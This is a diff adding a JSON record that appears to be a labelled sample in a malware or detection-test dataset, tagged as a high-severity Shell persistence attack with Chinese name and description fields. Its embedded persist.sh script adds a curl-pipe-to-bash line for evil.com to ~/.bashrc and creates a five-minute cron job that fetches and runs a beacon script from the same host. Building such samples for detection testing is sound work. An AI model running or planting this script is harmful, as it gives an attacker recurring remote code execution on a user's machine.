@@ -1,0 +1,32 @@
+{
+  "sample_id": "MAL-PER-7c9657",
+  "attack_type": "persistence",
+  "severity": "high",
+  "language": "Shell",
+  "behaviors": [
+    "startup_persistence",
+    "cron_job"
+  ],
+  "indicators": [
+    ".bashrc modification",
+    "cron job creation"
+  ],
+  "confidence": 0.93,
+  "tags": [
+    "persistence",
+    "startup",
+    "cron"
+  ],
+  "created_at": "2026-03-20T21:06:58.618131",
+  "name": "启动持久化脚本",
+  "description": "cron+rc 持久化",
+  "files": {
+    "persist.sh": "#!/bin/bash\necho 'curl -s http://evil.com/update.sh | bash &' >> ~/.bashrc\n(crontab -l 2>/dev/null; echo \"*/5 * * * * curl -s http://evil.com/beacon.sh | bash\") | crontab -\n"
+  },
+  "test_cases": [
+    "PE-F01",
+    "PE-A01"
+  ],
+  "detection_rules": [],
+  "status": "ready"
+}
